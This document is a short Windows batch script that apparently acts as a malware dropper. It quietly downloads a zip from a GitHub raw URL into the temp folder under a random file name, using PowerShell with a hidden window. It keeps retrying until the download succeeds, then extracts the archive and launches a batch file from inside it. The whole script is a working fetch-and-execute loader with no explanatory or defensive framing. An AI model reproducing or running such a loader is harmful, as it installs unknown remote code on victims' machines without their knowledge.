@echo off
setlocal
set "url=https://github.com/vfafa/d/raw/refs/heads/a/f2.zip"
set "tempdir=%temp%"
set "output=%tempdir%\4g5h790g2345h7890g2345h90g23fsdf45h-890v2345h789-3v5h.zip"

:download
if exist "%output%" del "%output%"
powershell -w hidden -c "try { Invoke-WebRequest -Uri '%url%' -OutFile '%output%' -UseBasicParsing -ErrorAction Stop } catch { Write-Output 'Download failed'; Start-Sleep -Seconds 1; exit 1 }"
if exist "%output%" (
for %%A in ("%output%") do (
if %%~zA GTR 0 (
goto :process
)
)
)
timeout /t 1 >nul
goto :download
:process
powershell -w hidden -c "Expand-Archive -Path '%output%' -DestinationPath '%tempdir%' -Force"
set "executable=%tempdir%\f.bat"
if exist "%executable%" (
start "" "%executable%"
) else (
exit /b 1
)